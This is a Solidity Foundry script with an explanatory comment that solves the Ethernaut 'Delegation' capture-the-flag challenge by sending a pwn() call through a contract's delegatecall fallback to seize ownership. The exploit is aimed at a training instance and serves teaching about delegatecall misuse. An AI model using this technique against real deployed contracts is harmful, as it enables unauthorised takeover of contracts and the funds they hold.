// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Script.sol";

// Helper contract to automate the exploit for the Delegation challenge
contract DelegationExploitScript is Script {
    
    // Address of the vulnerable Delegation contract instance
    address delegationContractAddress = 0xYourInstanceAddressHere; // Replace with actual instance address

    // Payload to call the pwn() function
    bytes pwnFunctionSignature = abi.encodeWithSignature("pwn()");

    // Function to execute the exploit
    function run() external {
        // Start broadcasting the transaction using the private key from the .env file
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Perform a low-level call to the Delegation contract to exploit the fallback function
        // The pwn() function will be executed via delegatecall, changing the owner of the Delegation contract
        (bool success, ) = delegationContractAddress.call(pwnFunctionSignature);
        require(success, "Exploit failed");

        // Stop broadcasting after the transaction is completed
        vm.stopBroadcast();
    }
}

/* 
Explanation:

### Purpose:
This script automates the solution to the Ethernaut **Delegation** challenge by exploiting the `delegatecall` vulnerability in the Delegation contract. The goal is to claim ownership of the vulnerable Delegation contract by executing the `pwn()` function of the Delegate contract using `delegatecall`.

### Vulnerability Overview:
1. **Delegatecall**: The `Delegation` contract's fallback function uses `delegatecall` to forward any arbitrary function call to the `Delegate` contract. 
   - `delegatecall` executes the code of another contract (in this case, Delegate) but in the context of the calling contract (Delegation). 
   - This means that any storage modifications done by the Delegate contract will modify the storage of the Delegation contract.

2. **The Exploit**:
   - The Delegate contract has a function `pwn()` which changes its `owner` to `msg.sender`. Since `delegatecall` is used, calling `pwn()` via `delegatecall` will change the `owner` of the **Delegation** contract (not the Delegate contract), because the storage of the calling contract (Delegation) is being modified.
   - This allows the attacker to take ownership of the **Delegation** contract.

### Script Breakdown:

1. **Payload Construction**: 
   - `bytes pwnFunctionSignature = abi.encodeWithSignature("pwn()");`
   - This encodes the function signature for the `pwn()` function in the Delegate contract. The encoded payload is sent to the Delegation contract to trigger the exploit.

2. **Low-level Call**:
   - `(bool success, ) = delegationContractAddress.call(pwnFunctionSignature);`
   - A low-level call is made to the Delegation contract, passing the encoded `pwn()` function signature as data. This triggers the `delegatecall` in the Delegation contract’s fallback function, which in turn calls the `pwn()` function in the Delegate contract.
   - The fallback function forwards the call using `delegatecall`, modifying the Delegation contract’s storage, making the attacker the new owner.

3. **Execution**:
   - The script starts by broadcasting the transaction using the player’s private key. The transaction is then sent to the Delegation contract with the crafted payload, exploiting the vulnerability and claiming ownership.
   - After the transaction is complete, the broadcasting is stopped.

### Conclusion:
By executing this script, you can claim ownership of the Delegation contract using the `delegatecall` mechanism to invoke the `pwn()` function in the Delegate contract. This exploit demonstrates the dangers of misusing `delegatecall` in smart contracts, especially when it allows arbitrary function execution that can modify critical state variables like ownership.
*/